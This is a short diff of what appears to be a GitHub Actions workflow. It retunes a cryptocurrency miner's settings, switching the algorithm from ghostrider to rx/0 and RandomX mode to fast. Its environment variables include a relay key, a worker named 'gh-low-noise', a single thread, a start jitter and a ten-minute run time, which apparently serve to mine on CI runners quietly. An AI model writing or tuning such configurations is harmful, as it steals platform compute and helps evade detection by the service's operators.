@@ -26,7 +26,7 @@ jobs:
           RELAY_ACCESS_KEY: ${{ inputs.relay_key }}
           WORKER: gh-low-noise
           THREADS: "1"
-          RANDOMX_MODE: light
-          ALGORITHM: ghostrider
+          RANDOMX_MODE: fast
+          ALGORITHM: rx/0
           START_JITTER_SECONDS: "10"
           RUN_SECONDS: "600"
